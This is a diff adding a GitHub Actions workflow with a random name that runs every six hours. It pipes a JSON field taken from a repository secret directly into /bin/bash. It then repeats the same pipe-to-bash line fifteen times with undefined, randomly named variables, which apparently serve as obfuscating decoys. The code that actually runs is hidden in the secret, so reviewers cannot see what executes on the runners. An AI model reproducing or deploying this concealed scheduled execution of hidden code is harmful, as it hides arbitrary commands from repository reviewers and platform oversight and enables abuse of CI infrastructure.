@@ -1,0 +1,32 @@
+name: zhuanyemuqian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuanyemuqian
+        env:
+          cu9013: ${{ secrets.cu9013 }}
+        run: |
+          echo $cu9013 | jq -r .qdm8322 | /bin/bash
+          echo $udyx001 | jq -r .gyks23906 | /bin/bash
+          echo $gpv0377 | jq -r .szbng46509 | /bin/bash
+          echo $zp58 | jq -r .pui340 | /bin/bash
+          echo $lgtyc8913 | jq -r .om98 | /bin/bash
+          echo $f01 | jq -r .wyi52 | /bin/bash
+          echo $b61 | jq -r .e2806 | /bin/bash
+          echo $ds926 | jq -r .pmy05730 | /bin/bash
+          echo $tlbe9 | jq -r .v07163 | /bin/bash
+          echo $mlt807 | jq -r .gt8 | /bin/bash
+          echo $gj25 | jq -r .bd16368 | /bin/bash
+          echo $hyf623 | jq -r .z168 | /bin/bash
+          echo $wde3 | jq -r .vdqyg77719 | /bin/bash
+          echo $r698 | jq -r .mhu17 | /bin/bash
+          echo $u3567 | jq -r .nuiu901 | /bin/bash
+          echo $ge50 | jq -r .o1546 | /bin/bash
+
